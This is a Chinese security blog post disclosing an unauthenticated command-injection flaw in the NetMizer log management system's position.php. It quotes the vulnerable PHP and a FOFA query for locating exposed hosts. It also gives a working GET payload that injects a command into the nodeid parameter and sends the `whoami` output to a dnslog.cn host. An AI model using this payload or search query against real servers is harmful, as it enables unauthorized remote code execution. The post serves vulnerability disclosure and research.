---
title: "NetMizer日志管理系统 position.php 命令执行漏洞"
source: https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html
asset_dir: assets/netmizer日志管理系统-position.php-命令执行漏洞
---

# NetMizer日志管理系统 position.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/11 08:26
* 1024浏览
* [0评论](#comment)
* 19分钟阅读

深入探索

sql

软件

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

NetMizer日志管理系统是一款专为网络流量管理和优化设计的日志记录与分析工具，能够高效采集、存储和分析网络设备及应用的日志数据。然而，该系统中的 `/data/search/position.php` 文件存在命令执行漏洞。未经身份验证的攻击者可以通过该漏洞在服务器端任意[执行命令](https://mrxn.net/tag/rce)，写入后门程序，获取服务器权限，进而控制整个Web服务器。

漏洞预警服务

# 影响版本

老旧版本

# fofa语法

`body="日志管理系统" && body="NetMizer"`

# 漏洞分析

看下 `position.php` 业务实现关键逻辑部分

深入探索

应用

网页服务器

服务器

```
<?php
        include('../include/JSON.php');

        $cmd = "/var/www/cgi-bin/search_qq";

        if(!$starttime){
                $stop_time = floor(time()/300)*300;
                $stop_time = 1471338000+3600;
                $start_time = $stoptime - 600;
        } else {
                list($year,$month,$day,$hour,$min,$second)=split(":| |-", urldecode($starttime));
                $start_time = mktime($hour, $min, $second, $month,$day,$year);
                $cmd .= " -s $start_time";
                list($year,$month,$day,$hour,$min,$second)=split(":| |-", urldecode($stoptime));
                $stop_time  = mktime($hour, $min, $second, $month,$day,$year);
                $cmd .= " -e $stop_time";
        }

        if($nodeid != ""){
                $sql_nodeid = " and nodeid = ".ip2long($nodeid)." ";
                $cmd .= " -n $nodeid";
        } else        $sql_nodeid = "";

        $srcip = $src;
        if($srcip == ""){
                $srcid = "-1";
        } else $srcid = ip2long($srcip); 
        if($srcid != "-1"){
                $sql_srcid = " and srcip = $srcid ";
                $cmd .= " -S $srcid";
        } else {
                $sql_srcid = "";
        }

        if($action == 'file'){
                //echo $cmd."\n";
                $fp = @popen($cmd,"r");
                if(!$fp){
                        echo '{"success":true,"info":"no data"}';
                        return;
                }
```

深入探索

鉴权

Web服务器

应用程序

`$nodeid` 未经过过滤或转义就直接插入命令字符串中使用`popen`执行拼接后的命令，造成[命令注入](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用示例

网络安全

```
GET /data/search/position.php?action=file&nodeid=1;ping+`whoami`.dnslog.cn+%23+ HTTP/1.1
Host: netmizer.mrxn.net
```

在DNSLOG平台成功收到DNS请求

[![NetMizer日志管理系统 position.php 命令执行漏洞](images/img-001-f943bea72184.webp)](https://image.mrxn.net/9900522a732448639dcc6afdb086c1c9.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[NetMizer日志管理系统 position.php 命令执行漏洞](https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html)  
文章链接：<https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/netmizer-data-search-position-nodeid-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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